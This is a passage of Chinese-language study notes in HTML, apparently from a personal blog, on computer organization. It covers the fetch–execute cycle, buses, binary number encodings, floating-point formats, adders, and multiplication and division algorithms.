title="控制器的基本任务"></a>控制器的基本任务</h4><p><code>按照计算程序所排的指令序列</code>，先从存储器<code>取出一条指令放到控制器中</code>，对<code>该指令的操作码由译码器进行分析判别</code>，然后根据指令性质，<code>执行这条指令</code>，进行相应的操作。</p><p>接着从存储器取出第二条指令，再执行这第二条指令。依次类推。</p><p>通常把取指令的一段时间称为取指周期，而把执行指令的一段时间称为执行周期。</p><p><code>控制器反复交替处于取指周期和执行周期之中。</code></p><p>每取出一条指令，<code>控制器中的指令计数器加1，为取下一条指令做好准备</code>，因此指令需要顺序存放。</p><p><code>运算器和控制器合称中央处理器</code>，简称<code>CPU</code>。</p><h4 id="指令流和数据流"><a href="#指令流和数据流" class="headerlink" title="指令流和数据流"></a>指令流和数据流</h4><p>指令和数据统统放在内存中，从形式上看，它们都是二进制数码，但是控制器可以区分开哪些是指令，哪些是数据。</p><p><code>取指周期中</code>从内存读出的信息流是指令流，流向控制器；而在<code>执行器周期中</code>从内存读出的信息流是数据流，由内存流向运算器。</p><p>计算机按照指令流和数据流可以分为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">单指令流单数据流（SISD），即传统的冯·诺依曼体系结构。</span><br><span class="line">单指令流多数据流（SIMD），包括阵列处理机和向量处理器系统。</span><br><span class="line">多指令流单数据流（MISD），实际上不存在。</span><br><span class="line">多指令流多数据流（MIMD），包括多处理器和多计算机系统</span><br></pre></td></tr></table></figure><h3 id="适配器与输入输出设备"><a href="#适配器与输入输出设备" class="headerlink" title="适配器与输入输出设备"></a>适配器与输入输出设备</h3><p>计算机的输入输出设备通常称为<code>外围设备</code><br><code>适配器</code>：使得被连接的<code>外围设备通过系统总线与主机进行联系</code>，以便使主机和外围设备并行协调地工作 。</p><p><code>系统总线</code>：构成计算机系统的骨架，是<code>多个系统部件之间进行数据传送的公共通路</code></p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%A1%86%E6%9E%B6.png" class=""><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F.png" class=""><p>多总线计算机系统结构</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%A4%9A%E6%80%BB%E7%BA%BF%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F.png" class=""><p>CPU中包含<code>控制器</code>、<code>算术逻辑部件ALU</code>、<code>通用寄存器组</code>、<code>总线接口部件</code>等。</p><p>CPU、主存和I/O模块之间<code>通过总线</code>交换信息：<code>处理器总线</code>用来传输与CPU交换的信息；<code>存储器总线</code>用来传输与主存交换的信息；<code>I/O总线</code>用来传输与设备控制器交换的信息，不同总线之间通过<code>I/O桥接器</code>相连。</p><h2 id="计算机软件"><a href="#计算机软件" class="headerlink" title="计算机软件"></a>计算机软件</h2><ol><li>系统软件：用来简化程序设计，简化使用方法，提高计算机的使用效率，发挥和扩大计算机的功能及用途，包括以下四类：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">各种服务性程序，如诊断程序、排错程序、练习程序等</span><br><span class="line">语言程序，如汇编程序、编译程序、解释程序等</span><br><span class="line">操作系统</span><br><span class="line">数据库管理系统</span><br></pre></td></tr></table></figure></li><li>应用软件：用户利用计算机来解决某些问题而编制的程序，如工程设计程序、数据处理程序、自动控制程序、企业管理程序、情报检索程序、科学计算程序等。</li></ol><h2 id="计算机系统的层次结构"><a href="#计算机系统的层次结构" class="headerlink" title="计算机系统的层次结构"></a>计算机系统的层次结构</h2><h3 id="多级组成的计算机系统"><a href="#多级组成的计算机系统" class="headerlink" title="多级组成的计算机系统"></a>多级组成的计算机系统</h3><p>第一级：微程序设计级，由机器硬件直接执行微指令，硬件级<br>第二级：一般机器级，微程序解释机器指令系统，硬件级<br>第三级：操作系统级，由操作系统程序实现，混合级<br>第四级：汇编语言级，由汇编程序支持和执行<br>第五级：高级语言级，由各种高级语言编译程序支持和执行</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" class=""><p>功能转换：上层是下层的<code>抽象</code>，下层是上层的<code>实现</code>，底层为上层提供<code>支撑环境</code>！</p><h3 id="软件和硬件的逻辑等价性"><a href="#软件和硬件的逻辑等价性" class="headerlink" title="软件和硬件的逻辑等价性"></a>软件和硬件的逻辑等价性</h3><p>随着大规模集成电路技术的发展和软件硬化的趋势，计算机系统的软、硬件界限已经变得模糊了。</p><p>因为任何操作可以由软件来实现，也可以由硬件来实现；任何指令的执行可以由硬件完成，也可以由软件来完成。</p><p>对于某一机器功能采用硬件方案还是软件方案，应考虑各个方面的因素：价格、速度、可靠性、存储容量、变更周期等。</p><p>实体硬件机功能扩大：将一些原来通过编制程序实现的操作，比如说整数乘除法指令、浮点运算指令、处理字符串指令等，改为直接由硬件完成。</p><p>固件的概念（功能上是软件，形态上是硬件）：使用容量大、体积小、价格低、可以改写的只读存储器将许多复杂的、常用的程序制作成固件。</p><h1 id="运算方法和运算器"><a href="#运算方法和运算器" class="headerlink" title="运算方法和运算器"></a>运算方法和运算器</h1><h2 id="数值型数据的表示方法"><a href="#数值型数据的表示方法" class="headerlink" title="数值型数据的表示方法"></a>数值型数据的表示方法</h2><h3 id="进位计数制"><a href="#进位计数制" class="headerlink" title="进位计数制"></a>进位计数制</h3><p>基数 和 权值W</p><h4 id="常用进制"><a href="#常用进制" class="headerlink" title="常用进制"></a>常用进制</h4><p>2，8，10，16进制</p><h4 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h4><p>除2取余、乘2取整、按权相加、逐位转换/分组转换</p><h3 id="带符号数的表示"><a href="#带符号数的表示" class="headerlink" title="带符号数的表示"></a>带符号数的表示</h3><p><code>0</code>表示正号<code>+</code>，<code>1</code>表示负号<code>-</code><br>二进制数的码制：原码、反码、补码、移码</p><h4 id="原码"><a href="#原码" class="headerlink" title="原码"></a>原码</h4><p>一个二进制数，0-1代码表示符号，数值位不变<br>真值：+1001010  -1001010<br>原码：01001010  11001010</p><p>字长8位的原码，表示范围：<code>-127~+127</code><br>[+127]原=0 0000000<br>[-127]原=1 1111111<br>数值<code>0</code>有两种原码形式：<br>[+0]原=0 0000000<br>[-0]原=1 0000000</p><h4 id="反码"><a href="#反码" class="headerlink" title="反码"></a>反码</h4><p>正数情况：<br>X反=X原(X&gt;=0)<br>例：X=+1101001(真值+105) X反=X原=0 1101001</p><p>负数情况：<br>符号位保持为<code>1</code>，数值位分别<code>按位取反</code><br>例：X=-1101001(真值-105) X原=1 1101001 X反=1 0010110</p><p>字长为8位的反码，表示范围：<code>-127~+127</code><br>[+127]反=0 1111111<br>[-127]反=1 000000<br>数值<code>0</code>也有两种反码形式：<br>[+0]反=0 0000000<br>[-0]反=1 1111111</p><h4 id="补码"><a href="#补码" class="headerlink" title="补码"></a>补码</h4><p>编码定义：[X]补=X+2^n(模2^n)，n为编码位数<br><strong>编码规则</strong><br>对于正数：<br>[X]补=[X]原</p><p>对于负数：<br>符号位仍保持为<code>1</code>，其余各数值位<code>按位取反，末位+1</code><br>[X]补=[X]反+……1</p><p>字长8位的补码，表示范围：<code>-128~+127</code><br>[+127]补=0 1111111<br>[-128]补=1 0000000</p><p>注意：补码比原码和反码多表示一个负值，即-128<br>数值<code>0</code>只有一种补码形式<br>[+0]补=[-0]补=0 0000000</p><h4 id="原码与补码之间的转换"><a href="#原码与补码之间的转换" class="headerlink" title="原码与补码之间的转换"></a>原码与补码之间的转换</h4><h5 id="已知-X-原，求-X-补"><a href="#已知-X-原，求-X-补" class="headerlink" title="已知[X]原，求[X]补"></a>已知[X]原，求[X]补</h5><p>正数：[X]补=[X]原<br>负数：符号位仍保持为<code>1</code>，其余各数值位<code>按位取反，末位+1</code>，[X]补=[X]反+……1</p><h5 id="已知-X-补，求-X-原"><a href="#已知-X-补，求-X-原" class="headerlink" title="已知[X]补，求[X]原"></a>已知[X]补，求[X]原</h5><p>[[X]补]补=[X]原</p><h5 id="求补-变补-，即已知-X-补，求-X-补"><a href="#求补-变补-，即已知-X-补，求-X-补" class="headerlink" title="求补(变补)，即已知[X]补，求[-X]补"></a>求补(变补)，即已知[X]补，求[-X]补</h5><p>[X]补的代码连同符号位一起变反，末位再加一</p><h4 id="移-增-码"><a href="#移-增-码" class="headerlink" title="移(增)码"></a>移(增)码</h4><p>移码通常用于表示浮点数的阶码<br>阶码一般为整数，所以移码通常只用于表示整数<br>[X]移=2^(n-1)+x，其中-2^(n-1)&lt;X&lt;2^(n-1)，这里的n为<code>X原</code>位数<br>上述规则等价于将X正向平移或者增加2^(n-1)</p><p>正数：将原码符号位变反<br>负数：将原码连同符号位一起变反，末位+1</p><p>补码和移码：符号相反、数值位相同</p><h3 id="定点数与浮点数"><a href="#定点数与浮点数" class="headerlink" title="定点数与浮点数"></a>定点数与浮点数</h3><h4 id="定点数的表示"><a href="#定点数的表示" class="headerlink" title="定点数的表示"></a>定点数的表示</h4><p>数的小数点固定在同一位置不变</p><h5 id="带符号的定点小数"><a href="#带符号的定点小数" class="headerlink" title="带符号的定点小数"></a>带符号的定点小数</h5><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E5%AE%9A%E7%82%B9%E5%B0%8F%E6%95%B0.png" class=""><p>字长<code>n+1</code>位，表示范围：<code>-(1-2^(-n))~1-2^(-n)</code></p><h5 id="带符号的定点整数"><a href="#带符号的定点整数" class="headerlink" title="带符号的定点整数"></a>带符号的定点整数</h5><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%B8%A6%E7%AC%A6%E5%8F%B7%E5%AE%9A%E7%82%B9%E6%95%B4%E6%95%B0.png" class=""><p>字长<code>n+1</code>位，则数的表示范围为：<code>-(2^n-1)~2^n-1</code></p><h5 id="无符号定点整数"><a href="#无符号定点整数" class="headerlink" title="无符号定点整数"></a>无符号定点整数</h5><p>小数点的位置固定在最低数值位之后<br>表示范围：<code>0~(2^(n+1)-1)</code>；分辨率为：1</p><h4 id="浮点数的表示原理"><a href="#浮点数的表示原理" class="headerlink" title="浮点数的表示原理"></a>浮点数的表示原理</h4><h5 id="浮点表示中，小数点的位置可按需浮动"><a href="#浮点表示中，小数点的位置可按需浮动" class="headerlink" title="浮点表示中，小数点的位置可按需浮动"></a>浮点表示中，小数点的位置可按需浮动</h5><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%B5%AE%E7%82%B9%E6%95%B0%E6%A0%BC%E5%BC%8F%E6%A8%A1%E5%9E%8B.png" class=""><h5 id="引入浮点数表示的意义"><a href="#引入浮点数表示的意义" class="headerlink" title="引入浮点数表示的意义"></a>引入浮点数表示的意义</h5><p>相同字长时，浮点数的表示范围更大、精度更高！</p><h5 id="浮点数的机器-存储-格式"><a href="#浮点数的机器-存储-格式" class="headerlink" title="浮点数的机器(存储)格式"></a>浮点数的机器(存储)格式</h5><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%B5%AE%E7%82%B9%E6%95%B0%E6%9C%BA%E5%99%A8%E6%A0%BC%E5%BC%8F.png" class=""><h5 id="尾数M的规格化表示"><a href="#尾数M的规格化表示" class="headerlink" title="尾数M的规格化表示"></a>尾数M的规格化表示</h5><p>目的：使浮点数的表示代码“唯一”<br><strong>浮点数用原码表示</strong><br>1/2&lt;=|M|&lt;1<br><strong>浮点数用补码表示</strong><br>-1&lt;=M&lt;-1/2 或 1/2&lt;=M&lt;1</p><p>对于原码：规格化以后尾数的最高有效位为<code>1</code><br>对于补码：正数，规格化以后最高数值位为<code>1</code>；负数，规格化以后最高数值位为<code>0</code></p><h4 id="IEE754格式的浮点数"><a href="#IEE754格式的浮点数" class="headerlink" title="IEE754格式的浮点数"></a>IEE754格式的浮点数</h4><p>32位 和 64位</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/32%E4%BD%8D%E5%8D%95%E7%B2%BE%E5%BA%A6.png" class=""><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/64%E4%BD%8D%E5%8F%8C%E7%B2%BE%E5%BA%A6.png" class=""><p>补充说明：</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%A1%A5%E5%85%85%E8%AF%B4%E6%98%8E.png" class=""><h2 id="字符型数据"><a href="#字符型数据" class="headerlink" title="字符型数据"></a>字符型数据</h2><h3 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h3><p>字符总数：128(0-9，大小写英文字母，运算符，标点符号，标示符，格式控制符等)<br>代码宽度：7b<br>存储宽度：7b(有效位)+1b(奇偶校验位)=8b</p><h3 id="汉字编码"><a href="#汉字编码" class="headerlink" title="汉字编码"></a>汉字编码</h3><h2 id="数据处理与存储"><a href="#数据处理与存储" class="headerlink" title="数据处理与存储"></a>数据处理与存储</h2><h3 id="移位操作"><a href="#移位操作" class="headerlink" title="移位操作"></a>移位操作</h3><h4 id="逻辑移位"><a href="#逻辑移位" class="headerlink" title="逻辑移位"></a>逻辑移位</h4><p>数码位置变化</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E9%80%BB%E8%BE%91%E7%A7%BB%E4%BD%8D.png" class=""><h4 id="算术移位"><a href="#算术移位" class="headerlink" title="算术移位"></a>算术移位</h4><p>符号位不变、数码位置变化</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E7%AE%97%E6%9C%AF%E7%A7%BB%E4%BD%8D.png" class=""><p><strong>正数补码\原码移位规则</strong><br>移位规则：<br>数符不变(单：符号位不变；双：第一符号位不变)<br>空位补0(右移时第二符号位移至尾数最高位)</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%A1%A5%E7%A0%81%E5%8E%9F%E7%A0%81%E7%A7%BB%E4%BD%8D%E8%A7%84%E5%88%99.png" class=""><p><strong>负数补码移位</strong><br>移位规则：<br>数符不变(单：符号位不变；双：第一符号位不变)<br>左移空位补0，右移空位补1(第二符号位移至尾数最高位)</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%B4%9F%E6%95%B0%E8%A1%A5%E7%A0%81%E7%A7%BB%E4%BD%8D%E8%A7%84%E5%88%99.png" class=""><h3 id="舍入方法"><a href="#舍入方法" class="headerlink" title="舍入方法"></a>舍入方法</h3><h4 id="0舍1入-原码、补码"><a href="#0舍1入-原码、补码" class="headerlink" title="0舍1入(原码、补码)"></a>0舍1入(原码、补码)</h4><h4 id="末位恒置1"><a href="#末位恒置1" class="headerlink" title="末位恒置1"></a>末位恒置1</h4><h3 id="数位扩展与压缩"><a href="#数位扩展与压缩" class="headerlink" title="数位扩展与压缩"></a>数位扩展与压缩</h3><h4 id="符号扩展"><a href="#符号扩展" class="headerlink" title="符号扩展"></a>符号扩展</h4><p>直接把符号位(0/1)填充到扩展位</p><h4 id="0-扩展"><a href="#0-扩展" class="headerlink" title="0-扩展"></a>0-扩展</h4><p>高位均全补0(针对无符号数)</p><h4 id="位数压缩-弃高位、留低位"><a href="#位数压缩-弃高位、留低位" class="headerlink" title="位数压缩 弃高位、留低位"></a>位数压缩 弃高位、留低位</h4><h3 id="数据存储-按字节编址"><a href="#数据存储-按字节编址" class="headerlink" title="数据存储(按字节编址)"></a>数据存储(按字节编址)</h3><h4 id="小端模式-Little-Endian"><a href="#小端模式-Little-Endian" class="headerlink" title="小端模式/Little-Endian"></a>小端模式/Little-Endian</h4><p>小地址单元存储数据的地位(即尾端)</p><h4 id="大端模式-Big-Endian"><a href="#大端模式-Big-Endian" class="headerlink" title="大端模式/Big-Endian"></a>大端模式/Big-Endian</h4><p>大地址单元存储数据的地位(即尾端)</p><h3 id="数据字的对齐"><a href="#数据字的对齐" class="headerlink" title="数据字的对齐"></a>数据字的对齐</h3><p>要求数据的地址是相应的边界地址</p><h2 id="定点加法、减法运算"><a href="#定点加法、减法运算" class="headerlink" title="定点加法、减法运算"></a>定点加法、减法运算</h2><h3 id="补码加法"><a href="#补码加法" class="headerlink" title="补码加法"></a>补码加法</h3><h4 id="原码加-减法运算"><a href="#原码加-减法运算" class="headerlink" title="原码加/减法运算"></a>原码加/减法运算</h4><p><code>加法规则：</code><br>先判符号位，若相同，绝对值相加，结果符号不变；若不同，则作减法，|大| - |小|，结果符号与|大|相同。</p><p><code>减法规则：</code><br>两个原码表示的数相减，首先将减数符号取反，然后将被减数与符号取反后的减数按原码加法进行运算。</p><h4 id="补码加法运算"><a href="#补码加法运算" class="headerlink" title="补码加法运算"></a>补码加法运算</h4><p>补码加法的公式：<br><code>[x]补＋[y]补＝[x＋y]补  (mod 2)</code></p><p>特点：</p><ol><li>不需要事先判断符号，符号位与码值位一起参加运算。</li><li>在模2n+1的意义下相加，即大于2n+1的进位要丢掉。</li></ol><p>在模2意义下，<code>任意两数的补码之和等于该两数之和的补码</code>。<br>这是补码加法的理论基础，该公式既适用于定点整数，也适用于定点小数。</p><h3 id="补码减法"><a href="#补码减法" class="headerlink" title="补码减法"></a>补码减法</h3><p>补码减法运算的公式：<br><code>[x－y]补＝[x]补－[y]补＝[x]补＋[-y]补</code></p><h3 id="溢出概念及检测方法"><a href="#溢出概念及检测方法" class="headerlink" title="溢出概念及检测方法"></a>溢出概念及检测方法</h3><p>概念与分析：<br>上溢：两个正数相加，结果大于机器字长所能表示的最大正数，称为正溢<br>下溢：两个负数相加，结果小于机器字长所能表示的最小负数，称为负溢</p><p>溢出的检测方法：</p><ol><li>单符号位法(无实际应用价值)</li><li>双符号位法(补码变形)(模4补码)</li></ol><p><code>采用变形补码后数的表示</code>：<br>任何小于1的正数： 两个符号位都是“0”，即 00.x1x2…xn;<br>任何大于-1的负数：两个符号位都是“1”，即 11.x1x2…xn</p><p><code>两数变形补码之和等于两数和的变形补码</code>，要求：<br>两个符号位都看做数码一样参加运算；<br>两数进行以4为模的加法，最高符号位上产生的进位要丢掉</p><p>双符号位的含义如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00         结果为正数，无溢出</span><br><span class="line">01         结果正溢</span><br><span class="line">10         结果负溢</span><br><span class="line">11         结果为负数，无溢出</span><br></pre></td></tr></table></figure><p>即：结果的两个符号位的代码不一致时，表示溢出；两个符号位的代码一致时，表示没有溢出。<br><strong>不管溢出与否，最高符号位永远表示结果的正确符号</strong><br>溢出逻辑表达式为：<code>V＝Sf1⊕Sf2</code></p><ol start="3"><li>利用进位值的判别法—-加法器中实际使用的方法</li></ol><h3 id="基本的二进制加法-减法器"><a href="#基本的二进制加法-减法器" class="headerlink" title="基本的二进制加法/减法器"></a>基本的二进制加法/减法器</h3><h4 id="一位全加器"><a href="#一位全加器" class="headerlink" title="一位全加器"></a>一位全加器</h4><p>加法运算：<br><code>Ai+Bi+Ci=Si  (Ci+1)</code></p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%B8%80%E4%BD%8D%E5%85%A8%E5%8A%A0%E5%99%A8%E7%9C%9F%E5%80%BC%E8%A1%A8.png" class=""><p>逻辑方程：<code>Si=Ai异或Bi异或Ci</code>; <code>Ci+1=AiBi+BiCi+CiAi=AiBi+(Ai异或Bi)Ci</code></p><p>一位全加器逻辑符号</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%B8%80%E4%BD%8D%E5%85%A8%E5%8A%A0%E5%99%A8%E9%80%BB%E8%BE%91%E7%AC%A6%E5%8F%B7.png" class=""><p>一位全加器逻辑电路图</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%B8%80%E4%BD%8D%E5%85%A8%E5%8A%A0%E5%99%A8%E9%80%BB%E8%BE%91%E7%94%B5%E8%B7%AF%E5%9B%BE.png" class=""><h4 id="n位的行波进位加减器"><a href="#n位的行波进位加减器" class="headerlink" title="n位的行波进位加减器"></a>n位的行波进位加减器</h4><p>n个1位的全加器(FA)可级联成一个n位的行波进位加减器</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/n%E4%BD%8D%E7%9A%84%E8%A1%8C%E6%B3%A2%E8%BF%9B%E4%BD%8D%E5%8A%A0%E5%87%8F%E5%99%A8.png" class=""><h4 id="n位行波进位加法器的时间延迟"><a href="#n位行波进位加法器的时间延迟" class="headerlink" title="n位行波进位加法器的时间延迟"></a>n位行波进位加法器的时间延迟</h4><p><code>T被定义为相应于单级逻辑电路的单位门延迟。</code><br>T通常采用一个<code>“与非”</code>门或一个<code>“或非”</code>门的时间延迟来作为度量单位。</p><p>典型门电路延迟时间：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">与非门：T</span><br><span class="line">或非门：T</span><br><span class="line">非门：T</span><br><span class="line">与门：2T</span><br><span class="line">或门：2T</span><br><span class="line">异或门：3T</span><br><span class="line">异或非门：3T</span><br><span class="line">接线逻辑(与或非)：T+TRC</span><br></pre></td></tr></table></figure><ol><li><p>对于一位全加器FA来说，Si时间延迟为6T(每级异或门延迟3T)；Ci+1的时间延迟为5T。</p></li><li><p>n位行波进位加法器的延迟时间ta为：<br>9T为最低位上的两极“异或”门再加上溢出“异或”门的总时间；<br>2T为每级进位链的延迟时间</p><p>考虑溢出检测时，有：ta＝n·2T＋9T＝(2n＋9)T<br>当不考虑溢出检测时，有：ta＝(n-1)·2T＋6T　</p><p>ta为在加法器的输入端输入加数和被加数后，在最坏的情况下加法器输出端得到稳定的求和输出所需要的最长时间</p></li></ol><h2 id="定点乘法运算"><a href="#定点乘法运算" class="headerlink" title="定点乘法运算"></a>定点乘法运算</h2><h3 id="原码乘法"><a href="#原码乘法" class="headerlink" title="原码乘法"></a>原码乘法</h3><h4 id="乘法的手工算法"><a href="#乘法的手工算法" class="headerlink" title="乘法的手工算法"></a>乘法的手工算法</h4><p>符号位异或，其余正常乘法<br>乘积符号的运算规则：<code>同号相乘为正，异号相乘为负</code></p><h4 id="原码一位乘法-？？？"><a href="#原码一位乘法-？？？" class="headerlink" title="原码一位乘法   ？？？"></a>原码一位乘法   ？？？</h4><p><strong>特点</strong>：每次只需要相加两个数，然后右移一位。相加的两个数（部分积和位积）都只有n位，因而不需要2n位的加法器</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%8E%9F%E7%A0%81%E4%B8%80%E4%BD%8D%E4%B9%98%E6%B3%95.png" class=""><p>原码一位乘法流程图</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%8E%9F%E7%A0%81%E4%B8%80%E4%BD%8D%E4%B9%98%E6%B3%95%E6%B5%81%E7%A8%8B%E5%9B%BE.png" class=""><p><strong>阵列乘法器</strong><br><code>串行加法器</code>的<code>优劣</code>分析</p><ol><li>不需要很多器件，硬件结构简单；</li><li>速度太慢，执行一次乘法操作的时间至少是加法操作的n倍；</li></ol><p><code>不带符号</code>的<code>阵列乘法器</code></p><h3 id="补码乘法"><a href="#补码乘法" class="headerlink" title="补码乘法"></a>补码乘法</h3><p><code>原码一位乘的缺点</code></p><ol><li>原码一位乘法的主要问题是：符号位不能参与运算。</li><li>而补码乘法可以实现符号位直接参与运算。</li></ol><p><code>补码一位乘法</code>又称<code>Booth算法</code></p><ol><li>真值与补码之间的关系<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E7%9C%9F%E5%80%BC%E4%B8%8E%E8%A1%A5%E7%A0%81%E7%9A%84%E5%85%B3%E7%B3%BB.png" class=""></li><li>补码的右移<br>在补码机器中，一个数不论其正负，连同符号位向右移一位，符号位保持不变，就等于乘1/2<br><code>[1/2x]补 = x0.x0x1x2…xn</code>，要得到[2^(-i)x]补，连同符号位右移<code>i</code>位即可。</li><li>补码乘法规则<br>被乘数  [x]补 = x0.x1x2…xn；乘数  [y]补 = y0.y1y2…yn；<br>补码乘法算式：<code>[x·y]补 = [x]补· y</code>或<code>[x·y]补 = [x]补·[−𝑦0+∑(𝑖=1)(𝑛)[𝑦𝑖·2^(−𝑖)]</code></li><li>补码一位乘的运算规则<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果 yn&#x3D;yn+1 ，则部分积 [zi] 加0，再右移一位；</span><br><span class="line">如果 ynyn+1&#x3D;01 ，则部分积 [zi] 加[x]补，再右移一位；</span><br><span class="line">如果 ynyn+1&#x3D;10 ，则部分积 [zi] 加[-x]补,  再右移一位；</span><br><span class="line">如此重复n + 1步，但最后一步不移位。</span><br><span class="line">包括一位符号位，所得乘积为2n+1位，其中n为尾数位数。</span><br></pre></td></tr></table></figure></li><li>算法流程图<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%A1%A5%E7%A0%81%E4%B8%80%E4%BD%8D%E4%B9%98%E6%B3%95%E6%B5%81%E7%A8%8B%E5%9B%BE.png" class=""></li></ol><p><code>Booth 4基乘法算法</code>  如：A·B   ？？？</p><h2 id="定点除法运算"><a href="#定点除法运算" class="headerlink" title="定点除法运算"></a>定点除法运算</h2><h3 id="原码一位除法"><a href="#原码一位除法" class="headerlink" title="原码一位除法"></a>原码一位除法</h3><p>被除数 x，其原码为<code>[x]原＝xf.xn-1… x1x0</code><br>除数 y，其原码为<code>[y]原＝yf.yn-1… y1y0</code><br>则有商q＝ｘ/ｙ,其原码为<code>[q]原＝(xf⊕yf)+(0.xn-1…x1x0/0.yn-1… y1y0)</code></p><p>商的符号运算<code>qf＝xf⊕yf</code>与原码乘法一样</p><ol><li>手算运算步骤<br>仿十进制除法运算</li><li>机器运算与手算的不同<br>在计算机中，小数点是固定的，不能简单地采用手算的办法。为便于机器操作，除数Y固定不变，被除数和余数进行左移相当于乘2）。</li></ol><p>机器不会心算，必须先作减法：<br>若余数为正，才知道够减；<br>若余数为负，才知道不够减。不够减时必须恢复原来的余数，以便再继续往下运算。这种方法称为<code>恢复余数法</code></p><p>要恢复原来的余数，只要当前的余数加上除数即可。但由于要恢复余数，使除法进行过程的步数不固定, 因此控制比较复杂。  </p><ol start="3"><li>加减交替法<br>由于恢复余数法的步数不固定，控制比较复杂，实际上常用的是<code>加减交替法</code></li></ol><p><strong>特点</strong>：当运算过程中出现不够减的情况，不必恢复余数，而是根据余数的符号，继续往下运算，因此步数固定，控制简单</p><p>运算规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">当余数为正时，商1，余数左移一位，减除数；</span><br><span class="line">当余数为负时，商0，余数左移一位，加除数。</span><br></pre></td></tr></table></figure><h3 id="补码一位除法"><a href="#补码一位除法" class="headerlink" title="补码一位除法"></a>补码一位除法</h3><p>被除数、除数用补码表示，符号位和数值位一起参与运算，商的符号位与数值位由统一的算法求得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">若被除数与除数同号，被除数减去除数；</span><br><span class="line">若被除数与除数异号，被除数加上除数。</span><br><span class="line"></span><br><span class="line">余数和除数同号，商1，余数左移一位，下次减除数；</span><br><span class="line">余数和除数异号，商0，余数左移一位，下次加除数。</span><br><span class="line"></span><br><span 